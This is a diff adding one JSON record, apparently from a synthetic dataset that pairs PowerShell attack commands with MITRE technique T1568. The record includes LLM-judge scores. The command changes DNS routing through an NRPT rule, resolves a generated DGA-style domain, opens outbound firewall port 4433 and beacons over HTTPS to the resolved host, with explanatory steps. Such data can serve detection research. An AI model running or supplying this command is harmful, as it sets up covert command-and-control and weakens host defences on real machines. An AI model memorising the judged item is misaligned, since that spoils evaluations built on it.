@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $ns='.telemetry-sync'; Add-DnsClientNrptRule -Namespace $ns -NameServers '9.9.9.9' -ErrorAction SilentlyContinue | Out-Null; Clear-DnsClientCache; $dom=('node{0}.c2{1}{2}' -f (Get-Random -Min 10 -Max 99),(Get-Date -Format 'MMdd'),$ns); $res=Resolve-DnsName $dom -Type A -ErrorAction SilentlyContinue; if($res){ netsh advfirewall firewall add rule name='out_4433' dir=out action=allow protocol=TCP remoteport=4433 | Out-Null; $ip=$res[0].IPAddress; if((Test-NetConnection -ComputerName $ip -Port 4433).TcpTestSucceeded){ Invoke-WebRequest -Uri ('https://{0}:4433/api' -f $dom) -Headers @{ Host=$dom; 'X-Req'=(Get-Random) } -TimeoutSec (Get-Random -Min 5 -Max 10) -UseBasicParsing } } }",
+  "explanation": "Adds an NRPT rule to route specific suffix queries to a custom resolver, resolves a DGA host, opens outbound 4433, verifies reachability, and then beacons.",
+  "rationale_steps": [
+    "Create an NRPT rule for selective DNS routing to an external resolver.",
+    "Generate and resolve a DGA domain under the controlled suffix.",
+    "Permit egress to a non-standard TLS port and verify connectivity.",
+    "Beacon over HTTPS using a Host header to maintain domain context."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-710592d1",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, braces, and parentheses, proper PowerShell syntax throughout, valid parameter names and flags, and correct use of pipeline operators and error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Dynamic Resolution technique by using a date-based domain generation algorithm with random components, custom DNS resolution paths, connection verification, and subsequent C2 beaconing over HTTPS with randomized parameters.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:55:15.597274Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, parentheses, and braces, and all cmdlets, parameters, and external commands are correctly formatted according to PowerShell syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command conceptually aligns well with T1568 by generating DGA domains, attempting to manipulate DNS resolution (NRPT), and beaconing, critical steps like adding the NRPT rule, clearing the DNS cache, and modifying the firewall require administrative privileges and will fail under the stated 'Privilege: None' condition, making its overall claimed intent only partially achievable.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:55:37.325045Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell is well-formed with balanced braces/quotes, valid cmdlets and parameters, and proper separators/pipelines.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates and resolves a domain and conditionally beacons, aligning with T1568, but NRPT and firewall changes generally require admin rights so those steps may fail under the stated non-privileged context.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T07:56:01.376675Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
